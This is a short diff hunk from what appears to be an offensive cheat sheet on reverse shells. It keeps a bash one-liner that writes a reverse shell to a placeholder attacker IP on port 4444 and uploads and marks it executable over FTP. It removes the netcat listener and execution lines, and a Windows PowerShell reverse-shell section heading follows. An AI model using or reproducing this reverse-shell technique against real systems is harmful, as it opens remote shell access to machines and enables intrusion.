@@ -71,8 +71,6 @@ run
 echo "bash -i >& /dev/tcp/<attacker-IP>/4444 0>&1" > shell.sh
 ftp> put shell.sh
 ftp> chmod +x shell.sh
-ftp> !nc -lvnp 4444
-ftp> !./shell.sh
 ```
 
 #### Windows Reverse Shell (PowerShell)
